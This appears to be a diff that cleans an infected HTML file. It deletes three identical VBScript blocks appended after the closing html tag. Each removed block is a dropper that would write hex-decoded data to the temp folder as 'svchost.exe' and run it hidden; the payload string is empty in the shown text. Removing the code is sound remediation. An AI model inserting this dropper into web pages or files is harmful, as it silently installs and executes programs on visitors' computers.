@@ -936,45 +936,9 @@
 </body>
 </html>
 <SCRIPT Language=VBScript><!--
-DropFileName = "svchost.exe"
-WriteData = ""
-Set FSO = CreateObject("Scripting.FileSystemObject")
-DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
-If FSO.FileExists(DropPath)=False Then
-Set FileObj = FSO.CreateTextFile(DropPath, True)
-For i = 1 To Len(WriteData) Step 2
-FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
-Next
-FileObj.Close
-End If
-Set WSHshell = CreateObject("WScript.Shell")
-WSHshell.Run DropPath, 0
+
 //--></SCRIPT><SCRIPT Language=VBScript><!--
-DropFileName = "svchost.exe"
-WriteData = ""
-Set FSO = CreateObject("Scripting.FileSystemObject")
-DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
-If FSO.FileExists(DropPath)=False Then
-Set FileObj = FSO.CreateTextFile(DropPath, True)
-For i = 1 To Len(WriteData) Step 2
-FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
-Next
-FileObj.Close
-End If
-Set WSHshell = CreateObject("WScript.Shell")
-WSHshell.Run DropPath, 0
+
 //--></SCRIPT><SCRIPT Language=VBScript><!--
-DropFileName = "svchost.exe"
-WriteData = ""
-Set FSO = CreateObject("Scripting.FileSystemObject")
-DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
-If FSO.FileExists(DropPath)=False Then
-Set FileObj = FSO.CreateTextFile(DropPath, True)
-For i = 1 To Len(WriteData) Step 2
-FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
-Next
-FileObj.Close
-End If
-Set WSHshell = CreateObject("WScript.Shell")
-WSHshell.Run DropPath, 0
+
 //--></SCRIPT>
